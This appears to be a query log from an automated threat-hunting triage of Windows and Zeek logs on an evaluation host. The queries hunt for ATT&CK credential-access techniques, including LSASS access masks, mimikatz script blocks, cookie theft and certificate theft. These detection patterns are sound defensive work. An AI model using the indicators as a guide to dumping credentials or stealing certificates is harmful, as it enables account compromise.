| q-9faef1eb3c | triage T1557 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.22-000001", "id": "AaFiKZc9VXKkeByOkBkA"} | None |  |
| q-76e5393101 | triage T1557 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.22-000001", "id": "AaFiKZc9VXKkeByNiUGc"} | None |  |
| q-0f80b952bd | triage T1557 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBi63kXo"} | None |  |
| q-048cc46bdc | triage T1557 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBnIEszs"} | None |  |
| q-0ea0023ff2 | triage T1558 step 1 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == 10 AND win.TargetImage LIKE \"*lsass*\" AND win.GrantedAccess IN (\"0x1fffff\",\"0x101001\",\"0x1f3fff\",\"0x1000000\",\"0x3000\",\"0x1400\") \| KEEP @timestamp, host.name,… | ERROR |  |
| q-d5010b2c03 | triage T1558 step 1 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code == 4769 \| KEEP @timestamp, host.name, user.name, win.ServiceName, win.TicketEncryptionType, win.TicketOptions, win.IpAddress, win.Status, source.ip, _id, _index \| SORT @ti… | ERROR |  |
| q-41f715e179 | triage T1558 step 2 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"10\" AND win.TargetImage LIKE \"*lsass*\" AND win.GrantedAccess IN (\"0x1fffff\",\"0x101001\",\"0x1f3fff\",\"0x1000000\",\"0x3000\",\"0x1400\") \| KEEP @timestamp, host.n… | 33 |  |
| q-9381604e5b | triage T1558 step 2 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code == \"4769\" \| KEEP @timestamp, host.name, user.name, win.ServiceName, win.TicketEncryptionType, win.TicketOptions, win.IpAddress, win.Status, source.ip, _id, _index \| SORT… | 28 | F46, F47, F48, F49 |
| q-36db0d9b23 | triage T1558 step 3 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXI"} | None | F45 |
| q-20df235257 | triage T1558 step 3 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBn663fz"} | None | F45 |
| q-e035c10ee5 | triage T1558 step 4 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND (process.executable LIKE \"*python*\" OR process.executable LIKE \"*PSEXESVC*\" OR process.executable LIKE \"*powershell*\" OR process.executable LIKE \"*cmd.exe\… | 38 | F45 |
| q-b0c168488c | triage T1558 step 4 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" AND (win.ScriptBlockText LIKE \"*lsass*\" OR win.ScriptBlockText LIKE \"*LSASS*\" OR win.ScriptBlockText LIKE \"*mimikatz*\" OR win.ScriptBlockText LIKE \"*Inv… | 16 |  |
| q-9ca07a5f59 | triage T1558 step 5 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" AND (win.ScriptBlockText LIKE \"*SeaDuke*\" OR win.ScriptBlockText LIKE \"*Invoke-Command*\" OR win.ScriptBlockText LIKE \"*Get-Process*\" OR win.ScriptBlockTe… | 16 |  |
| q-1f6c4213fc | triage T1558 step 5 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code == \"4624\" AND win.LogonType IN (\"3\",\"9\",\"10\") \| KEEP @timestamp, host.name, user.name, win.TargetUserName, win.LogonType, win.AuthenticationPackageName, win.IpAddre… | 220 |  |
| q-f037de4eac | triage T1558 step 6 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeByRaLqc"} | ERROR |  |
| q-66bfae1e38 | triage T1558 step 6 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeByDV_QB"} | ERROR |  |
| q-982ddcb2e7 | triage T1558 step 7 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE _id IN (\"AaFiKJc9VXKkeByRaLqc\",\"AaFiKJc9VXKkeByDV_QB\") \| KEEP @timestamp, host.name, user.name, win.ScriptBlockText, win.ScriptBlockId, _id, _index"} | 2 | F45 |
| q-bb8f170046 | triage T1558 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXI"} | None |  |
| q-8a149a557e | triage T1558 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXI"} | None |  |
| q-36b2f778cc | triage T1558 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBn663fz"} | None |  |
| q-1df3ca4812 | triage T1558 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBn663fz"} | None |  |
| q-38f832d16e | triage T1558 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRaLqc"} | None |  |
| q-7d6d348a1a | triage T1558 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoz4j7h"} | None |  |
| q-d13e911d78 | triage T1558 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBov08Fg"} | None |  |
| q-c90ac30201 | triage T1558 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBy4FbJD"} | None |  |
| q-f6d86a316d | triage T1558 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBy4FbJD"} | None |  |
| q-1c0d9760a2 | triage T1558 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuw7KBe"} | None |  |
| q-5dfa5d8454 | triage T1558 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuw7KBe"} | None |  |
| q-da4693444a | triage T1558 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuv697k"} | None |  |
| q-4340ea54b5 | triage T1558 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuv697k"} | None |  |
| q-8c2501a162 | triage T1558 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuv697k"} | None |  |
| q-0cfc357a37 | triage T1558 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBy8J3fS"} | None |  |
| q-c644f6b9ca | triage T1558 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBy8J3fS"} | None |  |
| q-4d3e8da563 | triage T1558 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBy8J3fS"} | None |  |
| q-055d20664e | triage T1558 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBy8J3fS"} | None |  |
| q-e9c5af6947 | triage T1606 step 1 | search | {"dataset": "windows.sysmon", "query": "event.code:10 AND win.TargetImage:*lsass* AND (win.GrantedAccess:0x1fffff OR win.GrantedAccess:0x101001 OR win.GrantedAccess:0x1f3fff OR win.GrantedAccess:0x1000000 OR win.GrantedAccess:0x3000)", "time_from": null, "time… | 9 | F51, F52 |
| q-09b8fda0d2 | triage T1606 step 1 | search | {"dataset": "windows.sysmon", "query": "event.code:11 AND (file.path:*cookie* OR file.path:*Cookies*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "process.executable", "process.command_line", "file.path", "user.name"], "size": 1… | 1 | F50, F51 |
| q-6d44d3ea9e | triage T1606 step 2 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXI"} | None |  |
| q-5e8aff5d82 | triage T1606 step 2 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXF"} | None |  |
| q-48a043ecdc | triage T1606 step 3 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND (process.pid:2976 OR process.parent.pid:2976 OR process.command_line:*lsass* OR process.command_line:*MiniDump* OR process.command_line:*dump*)", "time_from": null, "time_to": null, "fields": ["@timestam… | 6 |  |
| q-32300de080 | triage T1606 step 3 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" \| WHERE TO_LOWER(win.ScriptBlockText) LIKE \"*lsass*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*minidump*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*credentia… | 5 |  |
| q-33509e0bd6 | triage T1606 step 4 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByPYrDh"} | None | F51 |
| q-674cf96cc1 | triage T1606 step 4 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBorwtwa"} | None | F51 |
| q-0058e6009b | triage T1606 step 5 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" AND host.name == \"scranton.dmevals.local\" \| WHERE @timestamp >= \"2020-05-02T03:00:00Z\" AND @timestamp <= \"2020-05-02T03:12:00Z\" \| KEEP @timestamp, user… | 30 |  |
| q-2248ff4083 | triage T1606 step 5 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" \| WHERE TO_LOWER(win.ScriptBlockText) LIKE \"*invoke-*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*get-*credential*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*… | 19 |  |
| q-b231de5ab7 | triage T1606 step 6 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" AND host.name == \"scranton.dmevals.local\" \| WHERE @timestamp >= \"2020-05-02T03:04:30Z\" AND @timestamp <= \"2020-05-02T03:06:30Z\" \| KEEP @timestamp, user… | 18 |  |
| q-cfd6a7fdbb | triage T1606 step 6 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"11\" AND host.name == \"scranton.dmevals.local\" \| WHERE TO_LOWER(file.path) LIKE \"*.pfx\" OR TO_LOWER(file.path) LIKE \"*.7z\" OR TO_LOWER(file.path) LIKE \"*office*\"… | 4 | F51, F52 |
| q-41ad45e396 | triage T1606 step 7 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRaLqc"} | None | F51, F52 |
| q-c2f0f117b4 | triage T1606 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBi-6ySm"} | None |  |
| q-344c853608 | triage T1606 verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeBwdMB0b"} | None |  |
| q-64bd7cc50f | triage T1606 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXI"} | None |  |
| q-32ce10c400 | triage T1606 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXF"} | None |  |
| q-3da64a3d2c | triage T1606 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBorwtwa"} | None |  |
| q-cc541e05e0 | triage T1606 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRaLqc"} | None |  |
| q-2a94b9eec5 | triage T1606 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQkXH"} | None |  |
| q-f751d3415f | triage T1606 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByPYrDh"} | None |  |
| q-7831a50e56 | triage T1606 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBi-6ySm"} | None |  |
| q-e32738d613 | triage T1606 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRaLqc"} | None |  |
| q-4334b897cb | triage T1606 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQkXH"} | None |  |
| q-463eb8d4ac | triage T1606 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBo05T5k"} | None |  |
| q-f0fd18493d | triage T1606 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXI"} | None |  |
| q-df7b651d56 | triage T1621 step 1 | aggregate | {"dataset": "windows.other", "field": "event.code", "query": "event.code:4625 OR event.code:5857 OR event.code:5858", "time_from": null, "time_to": null, "size": 20, "sub_field": "host.name"} | 85 |  |
| q-744999d5ef | triage T1621 step 1 | esql | {"query": "FROM logs-windows.other-default METADATA _id, _index \| WHERE event.code == 5857 OR event.code == 5858 \| STATS c = COUNT(*) BY host.name, user.name, event.code \| SORT c DESC"} | ERROR |  |
| q-9bc583b7a4 | triage T1621 step 2 | esql | {"query": "FROM logs-windows.other-default METADATA _id, _index \| WHERE event.code == \"5857\" OR event.code == \"5858\" \| STATS c = COUNT(*) BY host.name, user.name, event.code \| SORT c DESC"} | 11 |  |
| q-4efd1f73a8 | triage T1621 step 2 | search | {"dataset": "windows.other", "query": "event.code:5857", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "user.name", "message", "win.param1", "win.param2", "win.param3"], "size": 5, "sort": "asc"} | 36 | F53 |
| q-9ee6997f98 | triage T1621 step 3 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE TO_LOWER(win.ScriptBlockText) LIKE \"*mfa*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*2fa*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*authenticator*\" OR TO_LOWER(win.ScriptBlockText… | 0 |  |
| q-945977352a | triage T1621 step 3 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code == \"4625\" OR event.code == \"4771\" OR event.code == \"4776\" OR event.code == \"4648\" \| STATS c = COUNT(*) BY event.code, host.name \| SORT c DESC"} | 3 |  |
| q-756b0d3320 | triage T1621 step 4 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code == \"4648\" OR event.code == \"4776\" \| KEEP @timestamp, host.name, event.code, user.name, win.SubjectUserName, win.TargetUserName, win.TargetServerName, win.ProcessName, w… | 16 | F53 |
| q-ee22967917 | triage T1621 step 4 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" \| STATS c = COUNT(*) BY process.executable, host.name \| SORT c ASC \| LIMIT 25"} | 25 |  |
| q-a60338d70d | triage T1621 step 5 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND (process.executable LIKE \"*dsregcmd*\" OR process.executable LIKE \"*cmd.exe\" OR process.executable LIKE \"*hostui*\" OR process.executable LIKE \"*wlrmdr*\" OR… | 20 |  |
| q-9fad1c12d4 | triage T1621 step 5 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code == \"4688\" AND (TO_LOWER(process.command_line) LIKE \"*mfa*\" OR TO_LOWER(process.command_line) LIKE \"*2fa*\" OR TO_LOWER(process.command_line) LIKE \"*authenticator*\" OR… | 0 |  |
| q-1f6d4ab589 | triage T1621 step 6 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" AND (TO_LOWER(win.ScriptBlockText) LIKE \"*hostui*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*dsregcmd*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*connect*\" O… | 8 |  |
| q-ead9b2f3a5 | triage T1621 step 6 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"11\" AND (TO_LOWER(file.path) LIKE \"*hostui*\" OR TO_LOWER(file.path) LIKE \"*victim*\") \| KEEP @timestamp, host.name, user.name, file.path, process.executable, _id, _i… | 4 | F53 |
| q-e5d7304951 | triage T1621 step 7 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByKWk9M"} | None | F53 |
| q-c35380445b | triage T1621 step 7 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBi30hQJ"} | None | F53 |
| q-0536349c30 | triage T1621 verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeBwdMB0b"} | None |  |
| q-12fbbbfb01 | triage T1621 verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeBwdMB0u"} | None |  |
| q-994e4f81f9 | triage T1621 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBunxq0T"} | None |  |
| q-47d39e2c2b | triage T1621 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuTlU_q"} | None |  |
| q-90b7e323f5 | triage T1621 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByKWk9M"} | None |  |
| q-fbe5593259 | triage T1621 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBi30hQJ"} | None |  |
| q-2736805400 | triage T1621 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoOSXoo"} | None |  |
| q-69e8bde70a | triage T1649 step 1 | search | {"dataset": "windows.security", "query": "event.code:4657 AND win.ObjectName:*SystemCertificates*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "pr… | 1 | F55 |
| q-4ee958cad3 | triage T1649 step 1 | search | {"dataset": "windows.security", "query": "event.code:4768", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "desti… | 14 | F55 |
| q-55ba9e985a | triage T1649 step 2 | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuu4mRU"} | None | F55 |
| q-6ccd0b7d23 | triage T1649 step 2 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"13\" AND registry.path LIKE \"*SystemCertificates*\" \| KEEP @timestamp, host.name, process.executable, registry.path, registry.data.strings, user.name, _id, _index \| LI… | 19 | F54, F55 |
| q-00feeea6f7 | triage T1649 step 3 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" AND (win.ScriptBlockText LIKE \"*Certificate*\" OR win.ScriptBlockText LIKE \"*Cert*\" OR win.ScriptBlockText LIKE \"*Crypto*\" OR win.ScriptBlockText LIKE \"*… | 1 | F54 |
| q-f3be1e003d | triage T1649 step 3 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND process.executable LIKE \"*powershell*\" \| KEEP @timestamp, host.name, process.executable, process.command_line, process.parent.executable, user.name, _id, _inde… | 12 |  |
| q-1cad785809 | triage T1649 step 4 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRaLqc"} | None | F54 |
| q-7d1d999a71 | triage T1649 step 4 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"11\" AND (file.path LIKE \"*.pfx\" OR file.path LIKE \"*Downloads*\") \| KEEP @timestamp, host.name, process.executable, file.path, user.name, _id, _index \| LIMIT 30"} | 30 | F54 |
| q-b8b8161acb | triage T1649 step 5 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQkXH"} | None | F54 |
| q-d52218eda6 | triage T1649 step 5 | esql | {"query": "FROM logs-zeek-default METADATA _id, _index \| WHERE event.action == \"x509\" \| STATS cnt = COUNT(*) BY zeek.certificate_subject, zeek.certificate_issuer, zeek.validation_status, zeek.certificate_not_valid_after \| SORT cnt DESC \| LIMIT 20"} | 2 |  |
| q-013401d495 | triage T1649 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRaLqc"} | None |  |
| q-bd18e6f2e6 | triage T1649 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRaLqc"} | None |  |
| q-3ffaec2417 | triage T1649 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRaLqc"} | None |  |
| q-33abd00d90 | triage T1649 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQkXH"} | None |  |
| q-2893946821 | triage T1649 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQkXH"} | None |  |
| q-b4a7110141 | triage T1649 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQkXN"} | None |  |
| q-38ac2b094a | triage T1649 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoNQ2BV"} | None |  |
| q-055b39a5c3 | triage T1649 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuu4mRU"} | None |  |
| q-c710dfa245 | triage T1649 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuu4mRU"} | None |  |
| q-6283eea8be | triage T1649 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBogld9W"} | None |  |
| q-67a43566a7 | triage T1649 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBi74TK0"} | None |  |
| q-cfabde438a | triage T1649 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBnQMVqo"} | None |  |
| q-75d98cda9e | triage T1649 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuy-fsg"} | None |  |
| q-1a6196c34c | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXI"} | None |  |
| q-507a1d22cb | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXI"} | None |  |
| q-e63106fff4 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBn663fz"} | None |  |
| q-b2998358b6 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBn663fz"} | None |  |
| q-3303812116 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByCVtlI"} | None |  |
| q-391ff27364 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByUbwus"} | None |  |
| q-fdca9f6a53 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoLO1t-"} | None |  |
| q-6e41a52fe4 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuWmZPb"} | None |  |
| q-52d7f50737 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuWmZPb"} | None |  |
| q-3956de2e62 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuWmZPb"} | None |  |
| q-cba892e634 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuv695R"} | None |  |
| q-7ab8debd13 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBizx7sV"} | None |  |
| q-310c986300 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBox14nu"} | None |  |
| q-b7a01258ad | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBox14nu"} | None |  |
| q-3ab49b2006 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBumw-cX"} | None |  |
| q-5611b17d6f | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBumw-cX"} | None |  |
| q-661625a1d4 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoglALi"} | None |  |
| q-a0f123c109 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByPYrDh"} | None |  |
| q-ac1903887e | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRaLqc"} | None |  |
| q-a2e0889ac6 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBjA9g2o"} | None |  |
| q-f5e0eb2c8c | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBnxyHFB"} | None |  |
| q-faa55adfaf | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBnvvDAD"} | None |  |
| q-525631f6b9 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBnvvDAD"} | None |  |
| q-59197b0774 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBnaXZbG"} | None |  |
| q-b5d3254b54 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBnkjXIW"} | None |  |
| q-cea4061483 | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeBwdMB1J"} | None |  |
| q-4b464dbe17 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBnFCvgF"} | None |  |
| q-3ae5de44ba | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoy3l7-"} | None |  |
| q-c91e464450 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoy3l7-"} | None |  |
| q-0ee7a5ba44 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBnyzTy7"} | None |  |
| q-cc36767a6e | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBnyzTy7"} | None |  |
| q-deca703e83 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuu5GRt"} | None |  |
| q-e34552dd33 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRabqD"} | None |  |
| q-dce1971e1a | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRabqD"} | None |  |
| q-954b1438c8 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRabqD"} | None |  |
| q-e9f82bc24d | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRabqD"} | None |  |
| q-3317d8d3c2 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXI"} | None |  |
| q-d2c4225514 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXF"} | None |  |
| q-c9dc009916 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXF"} | None |  |
